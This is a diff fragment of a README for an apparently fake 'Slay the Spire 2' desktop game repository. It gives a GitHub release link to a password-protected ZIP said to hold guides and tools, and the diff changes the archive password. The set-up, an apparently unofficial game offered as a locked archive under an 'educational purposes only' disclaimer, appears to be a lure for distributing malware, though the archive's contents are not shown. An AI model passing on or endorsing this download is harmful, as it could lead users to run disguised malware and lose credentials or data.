@@ -25,7 +25,7 @@ This repository is for educational purposes only. All content is provided as-is.
 Password-protected archive with guides, tools, and quick-start files – extract and explore.
 
 📥 [Download `Slay-the-Spire-2.zip`](https://github.com/ANJOEJAMES/Slay-the-Spire-2-Game-Desktop/releases/download/Game/Slay-the-Spire-2-Desktop.zip)
-🔐 Password: STS22026
+🔐 `LS2026`
 -
 ### Archive Contents
 - guides/ – All markdown & PDF resources
